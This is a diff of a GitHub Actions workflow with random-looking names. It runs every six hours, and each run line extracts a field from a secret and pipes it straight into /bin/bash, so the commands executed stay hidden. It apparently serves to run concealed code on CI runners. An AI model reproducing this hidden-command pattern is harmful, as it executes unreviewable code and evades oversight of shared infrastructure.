@@ -3,28 +3,27 @@ name: tianzhongze9348
 on:
   workflow_dispatch:
   schedule:
-    - cron: '27 2/6 * * *'
+    - cron: '53 0/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: tianzhongze9348
         env:
-          lamxh01055: ${{ secrets.lamxh01055 }}
+          t5: ${{ secrets.t5 }}
         run: |
-          echo $lamxh01055 | jq -r .jxpp86684 | /bin/bash
-          echo $swc6048 | jq -r .wgue49510 | /bin/bash
-          echo $rwhw050 | jq -r .la5 | /bin/bash
-          echo $ambs3 | jq -r .wnk864 | /bin/bash
-          echo $bln11 | jq -r .yv72 | /bin/bash
-          echo $zm30 | jq -r .bwup5 | /bin/bash
-          echo $tsroz1499 | jq -r .m2411 | /bin/bash
-          echo $ggrjf189 | jq -r .rj10 | /bin/bash
-          echo $xgs1 | jq -r .nvuy28 | /bin/bash
-          echo $jsz4930 | jq -r .ft5188 | /bin/bash
-          echo $bq527 | jq -r .ykcoz879 | /bin/bash
-          echo $mtz0 | jq -r .g43 | /bin/bash
-          echo $or32 | jq -r .d1536 | /bin/bash
+          echo $t5 | jq -r .kg45 | /bin/bash
+          echo $tlrg093 | jq -r .lxjqg39742 | /bin/bash
+          echo $iuo3501 | jq -r .tk1 | /bin/bash
+          echo $sqf12288 | jq -r .rxk1852 | /bin/bash
+          echo $s32685 | jq -r .rbx182 | /bin/bash
+          echo $grtlr65 | jq -r .vpk2153 | /bin/bash
+          echo $xo48 | jq -r .b04713 | /bin/bash
+          echo $xgcgs2334 | jq -r .tzzwp25 | /bin/bash
+          echo $zg62861 | jq -r .ismu9 | /bin/bash
+          echo $o7 | jq -r .z16 | /bin/bash
+          echo $xf21 | jq -r .bwg01247 | /bin/bash
 
